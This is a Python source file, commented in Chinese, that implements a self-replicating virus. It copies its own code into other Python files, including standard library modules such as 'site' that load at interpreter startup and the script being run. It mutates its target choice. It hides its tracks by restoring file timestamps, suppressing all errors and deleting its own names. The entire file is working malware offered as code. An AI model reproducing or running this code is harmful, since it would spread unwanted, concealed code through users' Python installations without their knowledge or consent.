genes={'minsize':3072,'target_mod':'site','cnt':0,'memory':[]}
mark="#####MyPython####"#v1.2.0

def find_code(file):
    code=''
    with open(file,encoding="utf-8") as f: # 部分解释器初始化阶段加载的底层模块(如encodings)不能用内置函数，包括open
        for line in f:
            if mark in line.strip():
                code=line+f.read() # 从mark所在的一行开始，读取后面的自身代码
    return code

def add_memory(gene,item): # 就地新增"基因"的记忆
    import sys,os;mem=gene['memory']
    mem.append(item);gene['cnt']+=1
    size=sum(len(item) for item in mem);maxsize=40
    while mem and size>maxsize:
        size-=len(mem.pop(0))
def mutate(gene): # 返回变异后的基因
    import sys,random as r
    mut=gene.copy();mut['memory']=gene['memory'].copy() # 复制一份gene
    if r.random()<0.2:
        mut['minsize']=max(1500,mut['minsize']+round(r.gauss(0,80))) # 更新最小目标文件大小
    if (r.random()<0.1 if '__name__'=='__main__' else r.random()<0.01):
        mod=None
        while not (hasattr(sys.modules.get(mod),'__file__') \
            and sys.modules[mod].__file__.lower().endswith('.py')):# 模块必须有.py源文件
            mod=r.choice(list(sys.modules)) # 随机选择新的模块
        mut['target_mod']=mod # 更新传播目标
    return mut

def spread_to_file(file,code):
    import os;stat=os.stat(file)
    old_time=stat.st_atime,stat.st_mtime
    with open(file,'r',encoding='utf-8') as f:
        for line in f:
            if mark in line:return # 如果目标文件已被传播
    if os.path.getsize(file)>=genes['minsize']:
        backup=genes['memory'].copy()
        add_memory(genes,os.path.split(file)[1])
        with open(file,'a',encoding='utf-8') as f: # 传播到目标文件
            f.write('\ngenes=%r\n' % mutate(genes)) # 在mark的一行前面存放genes
            f.write(code)
        os.utime(file,old_time) # 保留旧的修改日期
        genes['memory']=backup

def spread(mod,code): # 传播到模块
    spread_to_file(__import__(mod).__file__,code)

try:
    code=find_code(__file__)
    spread(genes['target_mod'],code)
    spread_to_file(__import__('sys').argv[0],code)
except:pass # 避免报错留下痕迹
del find_code,add_memory,mutate,spread,spread_to_file,genes,mark # 清理命名空间，避免在标准库如site留下痕迹
try:del code
except NameError:pass
